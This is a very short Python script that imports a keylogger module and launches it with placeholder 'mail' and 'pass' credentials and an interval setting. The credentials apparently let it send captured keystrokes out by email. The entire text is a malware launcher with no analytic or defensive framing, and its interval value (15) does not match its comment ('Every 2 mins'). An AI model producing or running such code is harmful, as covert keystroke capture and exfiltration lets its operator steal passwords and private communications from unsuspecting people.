import keylogger

logger = keylogger.Keylogger(15, "mail", "pass") # Every 2 mins
logger.launch()